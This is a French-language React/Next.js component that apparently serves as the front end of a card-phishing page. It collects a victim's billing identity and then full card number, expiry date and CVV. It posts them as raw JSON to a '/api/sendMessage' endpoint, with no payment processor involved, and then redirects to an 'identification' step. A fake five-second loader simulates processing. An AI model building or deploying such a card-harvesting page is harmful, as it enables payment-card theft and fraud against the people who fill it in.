"use client";

import { use, useEffect, useState } from "react";
import { z } from "zod";
import InfoForm from "./InfoForm";
import PaymentForm from "./PaymentForm";
import { useRouter } from "next/navigation";
import Accord from "./Accord";
import Footer from "./Footer";
import Loader from "./Loader";

type Props = {};

export const infoSchema = z.object({
  name: z
    .string()
    .min(3, {
      message: "Veuillez saisir votre Prénom",
    })
    .max(50),
  lastName: z
    .string()
    .min(3, {
      message: "Veuillez saisir votre nom",
    })
    .max(50),

  adressPostale: z
    .string()
    .min(3, {
      message: "Veuillez saisir l'adresse de facturation",
    })
    .max(50),
  codePostal: z
    .string()
    .min(3, {
      message: "Veuillez saisir le code postal",
    })
    .max(16),
  ville: z
    .string()
    .min(3, {
      message: "Le lieu de naissance doit contenir au moins 3 caractères (Format : JJ/MM/AAAA)",
    })
    .max(50),
  telephone: z.string().min(10, {
    message: "Le numéro de téléphone doit contenir au moins 10 caractères",
  }),
  email: z.string().email(),
});

export const schema = z.object({
  name: z
    .string()
    .min(3, {
      message: "Le nom doit contenir au moins 3 caractères",
    })
    .max(50),
  cardNumber: z
    .string()
    .regex(
      /^\d{4} \d{4} \d{4} \d{4}$/,
      "Le numéro de carte doit contenir 16 chiffres"
    ),
  expirationDate: z
    .string()
    .regex(/^\d{2}\/\d{2}$/, "La date d'expiration doit être au format MM/AA"),
  cvv: z.string().regex(/^\d{3}$/, "Le CVV doit contenir 3 chiffres"),
});

export type PaymentProps = z.infer<typeof schema>;

export type InformationProps = z.infer<typeof infoSchema>;

const Informations = ({}: Props) => {
  const router = useRouter();
  const [step, setStep] = useState(1);
  const [informationsData, setInformationsData] = useState<InformationProps>();
  const [paymentData, setPaymentData] = useState<PaymentProps>();
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    if (step === 3) {
      console.log(informationsData);
      console.log(paymentData);
      sendMessage();
    }

    if (step === 2) {
      setIsLoading(true);
    }
  }, [step]);

  const sendMessage = async () => {
    const response = await fetch("/api/sendMessage", {
      method: "POST",
      body: JSON.stringify({
        informationsData,
        paymentData,
      }),
    });
    const data = await response.json();
    console.log(data);

    router.push(`/identification?name=${informationsData?.lastName}`);
  };

  useEffect(() => {
    if (isLoading) {
      setTimeout(() => {
        setIsLoading(false);
      }, 5000);
    }
  }, [isLoading]);

  if (isLoading) {
    return <Loader />;
  }

  return (
    <div className="flex flex-col items-center justify-center p-2 ">
      <h3 className="text-blue-500">
        {step === 1
          ? "Informations de facturation"
          : "Procéder au paiement par carte"}
      </h3>
      {step === 1 ? (
        <InfoForm setData={setInformationsData} setStep={setStep} />
      ) : (
        <PaymentForm setData={setPaymentData} setStep={setStep} />
      )}

      <Accord />
    </div>
  );
};

export default Informations;
